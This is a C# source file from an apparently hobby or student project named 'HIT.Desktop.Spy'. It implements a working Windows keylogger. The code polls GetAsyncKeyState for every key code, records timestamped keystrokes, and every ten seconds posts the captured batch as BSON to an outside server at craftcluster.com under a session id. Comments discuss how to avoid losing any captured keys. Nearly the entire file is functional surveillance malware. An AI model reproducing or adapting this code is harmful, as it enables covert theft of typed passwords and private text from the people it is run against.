using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Formatting;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using HIT.Web.Infrastructure.Extensions;
using HIT.Web.ViewModels;

namespace HIT.Desktop.Spy
{
    public class Keylogger : IRunnable
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        private static object syncLock = new object();

        private readonly string SessionId;
        private readonly Timer timer;

        private bool isRunning = true;
        private int extraBufferSize = 5;
        private List<string> keysPressedList;
        
        public Keylogger(string sessionId)
        {
            this.SessionId = sessionId;
            this.keysPressedList = new List<string>();

            var dueTime = 2000;
            var period = 10000;
            this.timer = new Timer(async (obj) => { await this.TimerEventHandler(); }, null, dueTime, period);
        }

        public Task Start()
        {
            while (this.isRunning)
            {
                for (Int32 i = 0; i < 255; i++)
                {
                    var keyState = GetAsyncKeyState(i);

                    if (keyState == 1 || keyState == -32767)
                    {
                        var key = (Keys)i;

                        if (key != Keys.LButton && key != Keys.RButton)
                        {
                            this.keysPressedList.Add($"[{DateTime.Now}] - {key}");
                        }
                    }
                }

                Thread.Sleep(10);
            }

            return null;
        }

        public async void Stop()
        {
            this.isRunning = false;
            await this.SendKeysPressedAsync(this.keysPressedList);
        }

        private IList<string> CopyList(IList<string> list)
        {
            var clonedList = new List<string>(list.Count + this.extraBufferSize);
            for (int i = 0; i < list.Count; i++)
            {
                clonedList.Add(string.Copy(list[i]));
            }

            return clonedList;
        }

        private async Task TimerEventHandler()
        {
            if (this.keysPressedList.IsNotNull() && this.keysPressedList.Count > 0)
            {
                // TODO: Not perfect, still has a chance of losing  
                // some of the keys pressed (while the list is being copied and cleared after that), 
                // yet the best solution at this moment

                // Potential solution might be to use a lock on the keysPressedList object, so that the keylogger
                // wont be able to modify its contents, but this will lead to a waiting state on the thread
                // and we will still miss some of the user input
                IList<string> keysToSend;
                lock (syncLock)
                {
                    keysToSend = this.CopyList(this.keysPressedList);
                    // Between the execution of these commands, a key press might be added to the original list
                    // in which case it will not be sent to the server, because we are clearing the original list
                    this.keysPressedList.Clear();
                }
                // A way to solve the problem with missing keys is to send the whole list everytime
                // but this will have a huge impact on performance and will lead to memory leaks 
                
                // Genious solution - 
                // Copy only the first 10 logged symbols in the keysToSendList
                // Remove the first 10 logged symbols from the original list
                // Better yet - use a queue, and dequeue the symbols that must be sent
                // Enqueue the keys that are pressed while we are dequeu-ing.
                // This will result in a no loss of keys logged
                // Brilliant, Ivan, Brilliant!
                try
                {
                    await this.SendKeysPressedAsync(keysToSend);
                }
                catch (Exception e)
                {
                    // log the exception cause
                }
            }
        }

        private async Task SendKeysPressedAsync(IList<string> data)
        {
            var model = new KeysPressedViewModel
            {
                SessionId = this.SessionId,
                KeysPressedList = data
            };

            using (var client = new HttpClient())
            {
                // Set the API base address
                //client.BaseAddress = new Uri("http://localhost:62164/");
                client.BaseAddress = new Uri("http://craftcluster.com/");

                // Set the Accept header for BSON
                client.DefaultRequestHeaders.Accept.Clear();
                client.DefaultRequestHeaders.Accept.Add(
                    new MediaTypeWithQualityHeaderValue("application/bson"));

                // POST using the BSON formatter
                var bsonFormatter = new BsonMediaTypeFormatter();
                var result = await client.PostAsync("api/Sessions/PostKeysPressed", model, bsonFormatter);

                result.EnsureSuccessStatusCode();
            }
        }
    }
}
